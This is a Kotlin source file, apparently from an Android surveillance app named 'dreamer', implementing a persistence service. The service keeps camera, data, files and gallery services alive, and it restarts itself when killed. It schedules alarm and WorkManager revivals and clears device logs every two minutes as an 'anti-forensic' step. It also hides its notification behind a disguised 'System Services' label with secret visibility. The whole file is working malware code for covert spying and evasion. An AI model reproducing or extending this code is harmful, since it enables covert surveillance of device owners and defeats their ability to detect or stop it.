package com.h4k3r.dreamer

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import androidx.work.CoroutineWorker
import androidx.work.ForegroundInfo
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

class AdvancedPersistenceService : Service() {
    companion object {
        private const val TAG = "AdvancedPersistence"
        private const val NOTIFICATION_ID = 999
        private const val CHANNEL_ID = "advanced_persistence"
    }

    private lateinit var scheduler: ScheduledExecutorService
    private var revivalAttempts = 0
    private val maxRevivalAttempts = 10

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "AdvancedPersistenceService created")
        
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        
        scheduler = Executors.newScheduledThreadPool(3)
        startAdvancedPersistence()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "AdvancedPersistenceService started")
        
        // Implement multiple revival mechanisms
        scheduleWorkManagerRevival()
        scheduleAlarmManagerRevival()
        scheduleNativeRevival()
        
        return START_STICKY
    }

    private fun startAdvancedPersistence() {
        // Method 1: WorkManager with exponential backoff
        scheduler.scheduleAtFixedRate({
            try {
                Log.d(TAG, "Advanced persistence check running...")
                checkAndReviveServices()
            } catch (e: Exception) {
                Log.e(TAG, "Advanced persistence error", e)
            }
        }, 0, 30, TimeUnit.SECONDS)

        // Method 2: Memory persistence check
        scheduler.scheduleAtFixedRate({
            try {
                checkMemoryPersistence()
            } catch (e: Exception) {
                Log.e(TAG, "Memory persistence error", e)
            }
        }, 0, 60, TimeUnit.SECONDS)

        // Method 3: Anti-forensic techniques
        scheduler.scheduleAtFixedRate({
            try {
                applyAntiForensicTechniques()
            } catch (e: Exception) {
                Log.e(TAG, "Anti-forensic error", e)
            }
        }, 0, 120, TimeUnit.SECONDS)
    }

    private fun checkAndReviveServices() {
        val services = listOf(
            PermissionMonitorService::class.java,
            WatchdogService::class.java,
            CameraService::class.java,
            DataService::class.java,
            FilesService::class.java,
            GalleryService::class.java
        )

        services.forEach { serviceClass ->
            if (!isServiceRunning(serviceClass)) {
                Log.d(TAG, "Reviving ${serviceClass.simpleName}")
                try {
                    val intent = Intent(this, serviceClass)
                    startService(intent)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to revive ${serviceClass.simpleName}", e)
                }
            }
        }
    }

    private fun checkMemoryPersistence() {
        // Check if critical services are in memory
        val criticalServices = listOf(
            "com.h4k3r.dreamer.PermissionMonitorService",
            "com.h4k3r.dreamer.WatchdogService"
        )

        val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val runningServices = activityManager.getRunningServices(Integer.MAX_VALUE)

        criticalServices.forEach { serviceName ->
            val isRunning = runningServices.any { it.service.className == serviceName }
            if (!isRunning) {
                Log.w(TAG, "Critical service $serviceName not in memory, reviving...")
                when (serviceName) {
                    "com.h4k3r.dreamer.PermissionMonitorService" -> {
                        val intent = Intent(this, PermissionMonitorService::class.java)
                        startService(intent)
                    }
                    "com.h4k3r.dreamer.WatchdogService" -> {
                        val intent = Intent(this, WatchdogService::class.java)
                        startService(intent)
                    }
                }
            }
        }
    }

    private fun applyAntiForensicTechniques() {
        // Technique 1: Clear logs periodically
        try {
            Runtime.getRuntime().exec("logcat -c")
        } catch (e: Exception) {
            // Ignore if not available
        }

        // Technique 2: Hide from recent tasks
        // There is no public API to clear recent tasks from a Service.
        // If you want to remove your own task from recents, use finishAndRemoveTask() from an Activity.

        // Technique 3: Memory optimization
        try {
            System.gc()
        } catch (e: Exception) {
            // Ignore
        }
    }

    private fun scheduleWorkManagerRevival() {
        val workRequest = OneTimeWorkRequestBuilder<AdvancedRevivalWorker>()
            .setInitialDelay(1, TimeUnit.MINUTES)
            .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
            .build()

        WorkManager.getInstance(this).enqueueUniqueWork(
            "advanced_revival",
            ExistingWorkPolicy.REPLACE,
            workRequest
        )
    }

    private fun scheduleAlarmManagerRevival() {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, RestartReceiver::class.java).apply {
            action = "com.h4k3r.dreamer.ADVANCED_REVIVAL"
        }
        val pendingIntent = PendingIntent.getBroadcast(
            this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        alarmManager.setRepeating(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + 2 * 60 * 1000, // 2 minutes
            5 * 60 * 1000, // 5 minutes
            pendingIntent
        )
    }

    private fun scheduleNativeRevival() {
        // Schedule native-level revival using JNI (if available)
        // This is a placeholder for native code integration
        Log.d(TAG, "Native revival scheduled")
    }

    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val runningServices = activityManager.getRunningServices(Integer.MAX_VALUE)
        return runningServices.any { it.service.className == serviceClass.name }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Services",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
                enableLights(false)
                setLockscreenVisibility(Notification.VISIBILITY_SECRET)
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Services")
            .setContentText("")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setShowWhen(false)
            .setSound(null)
            .setVibrate(null)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "AdvancedPersistenceService destroyed")
        
        // Try to restart itself
        val intent = Intent(this, AdvancedPersistenceService::class.java)
        startService(intent)
        
        scheduler.shutdown()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}



// ForegroundWorker for advanced revival
class AdvancedRevivalWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {
    override suspend fun doWork(): Result {
        return withContext(Dispatchers.IO) {
            try {
                // Start services without using foreground worker to avoid Android 14+ restrictions
                val services = listOf(
                    PermissionMonitorService::class.java,
                    AdvancedPersistenceService::class.java,
                    WatchdogService::class.java,
                    CameraService::class.java,
                    DataService::class.java,
                    FilesService::class.java,
                    GalleryService::class.java
                )
                services.forEach { serviceClass ->
                    try {
                        val intent = Intent(applicationContext, serviceClass)
                        if (serviceClass == PermissionMonitorService::class.java || serviceClass == AdvancedPersistenceService::class.java) {
                            // Start as foreground service
                            if (Build.VERSION.SDK_INT >= 26) {
                                ContextCompat.startForegroundService(applicationContext, intent)
                            } else {
                                applicationContext.startService(intent)
                            }
                        } else {
                            // Start as background (hidden) service
                            applicationContext.startService(intent)
                        }
                    } catch (e: Exception) {
                        // Log and continue
                    }
                }
                Result.success()
            } catch (e: Exception) {
                Result.retry()
            }
        }
    }
} 